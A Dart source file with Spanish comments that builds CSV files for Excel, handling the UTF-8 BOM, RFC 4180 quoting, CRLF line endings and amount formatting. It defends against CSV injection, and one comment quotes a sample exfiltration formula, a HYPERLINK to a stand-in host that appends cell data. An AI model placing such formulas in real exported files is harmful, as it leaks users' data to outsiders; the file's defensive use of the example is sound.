/// Construcción de archivos CSV que Excel abre bien.
///
/// Función pura y sin dependencias: recibe encabezados y filas, devuelve el
/// texto. Todo lo que toca disco vive en `services/exportacion_service.dart`,
/// para que esta parte —la que es fácil de equivocar— se pueda probar sola.
library;

/// Marca de orden de bytes UTF-8.
///
/// Sin esto Excel en Windows abre el archivo con la página de códigos local y
/// destroza cualquier acento: "Camión" sale como "CamiÃ³n". Es el motivo #1 por
/// el que un CSV "no funciona" para un usuario hispanohablante.
const String _bomUtf8 = '\uFEFF';

/// Caracteres que, al inicio de una celda, hacen que Excel interprete el
/// contenido como FÓRMULA en vez de como texto.
///
/// Un nombre de producto es texto que escribió una persona. Si alguien captura
/// un producto llamado `=1+1` o, peor, algo como
/// `=HYPERLINK("http://malo/"&A1,"clic")`, al abrir el CSV Excel lo ejecuta.
/// Se conoce como "CSV injection" y es una vía real de fuga de datos cuando el
/// archivo se comparte con el contador.
const Set<String> _prefijosPeligrosos = {'=', '+', '-', '@', '\t', '\r'};

/// Escapa un valor para una celda CSV según RFC 4180.
///
/// - Se encierra entre comillas si contiene coma, comilla o salto de línea.
/// - Las comillas internas se duplican (`"` -> `""`).
/// - Si empieza con un carácter de fórmula, se antepone una comilla simple
///   para que Excel lo trate como texto (ver [_prefijosPeligrosos]).
String escaparCampoCsv(Object? valor) {
  var texto = valor?.toString() ?? '';

  if (texto.isNotEmpty && _prefijosPeligrosos.contains(texto[0])) {
    texto = "'$texto";
  }

  final necesitaComillas = texto.contains(',') ||
      texto.contains('"') ||
      texto.contains('\n') ||
      texto.contains('\r');

  if (!necesitaComillas) return texto;

  return '"${texto.replaceAll('"', '""')}"';
}

/// Arma el CSV completo a partir de [encabezados] y [filas].
///
/// Separador coma y no punto y coma: en la configuración regional de México
/// (y en general donde el separador decimal es el punto) el separador de lista
/// de Windows es la coma, que es lo que Excel espera al abrir un .csv. En
/// España, con coma decimal, habría que usar punto y coma -- si algún día hay
/// que soportar ambos, este es el único punto a tocar.
///
/// Terminador CRLF, como manda el RFC 4180 y como espera Excel en Windows.
String construirCsv({
  required List<String> encabezados,
  required List<List<Object?>> filas,
  bool incluirBom = true,
}) {
  final buffer = StringBuffer();

  if (incluirBom) buffer.write(_bomUtf8);

  buffer.write(encabezados.map(escaparCampoCsv).join(','));
  buffer.write('\r\n');

  for (final fila in filas) {
    buffer.write(fila.map(escaparCampoCsv).join(','));
    buffer.write('\r\n');
  }

  return buffer.toString();
}

/// Formatea un número para una celda de importe.
///
/// Sin símbolo de moneda y con punto decimal: la celda debe llegar a Excel
/// como NÚMERO, no como texto. Un "$1,234.50" se pega como cadena y rompe
/// cualquier suma que el contador intente hacer encima -- justo lo que se
/// quiere evitar al exportar.
String montoCsv(num? valor) => (valor ?? 0).toStringAsFixed(2);
